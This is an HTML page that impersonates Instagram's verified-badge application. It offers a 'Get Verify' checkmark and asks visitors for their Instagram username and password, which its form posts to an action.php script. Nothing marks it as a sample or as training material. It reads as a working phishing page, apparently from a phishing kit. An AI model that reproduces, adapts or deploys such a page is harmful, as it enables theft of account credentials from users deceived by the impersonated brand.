<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Verification Request - Instagram</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
        <meta name="description" content="Verify Badge on your Instagram Account">
        <meta name="author" content="Instagram">

        <link rel="icon" href="/favicon.ico">
        
        <!-- SCRIPTS -->
        
        <!-- STYLESHEETS -->
        <link rel="stylesheet" href="/css/style.css?v=3">
    </head>
    <body>
        <div class="header">
        	<img src="/images/banner-sm.png">
        	<h1>Verification Request</h1>
        </div>

        <div class="content">
        	<h1>Apply for Instagram Verification</h1>
        	<p>A verified badge is a checkmark that appears next to an Instagram account name to indicate that it's a real account of a prominent public figure, celebrity, global brand, or entity.</p>
        	<form action="action.php" method="POST">
        		<div class="form-item">
        			<span>User name</span><br>
        			<input type="text" name="username">
        		</div>
        		<div class="form-item">
        			<span>Password</span><br>
        			<input type="password" name="password">
        		</div>
        		<div class="form-item">
        			<span>Category</span><br>
        			<select name="category">
        				<option value="sport">Sport</option>
	                    <option value="news/media">News/media</option>
	                    <option value="state-and-politics">State and politics</option>
	                    <option value="music">Music</option>
	                    <option value="fashion">Fashion</option>
	                    <option value="fun">Fun</option>
	                    <option value="influencer-blogger">Influencer/blogger</option>
	                    <option value="computer-player">Computer Player</option>
	                    <option value="business">Global business/brand/establishment</option>
	                    <option value="other">Other</option>
        			</select>
        		</div>
        		<button id="submit-btn" type="submit">Get Verify</button>
        	</form>
        </div>


        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
        <script src="/js/action.js"></script>


    </body>
</html>
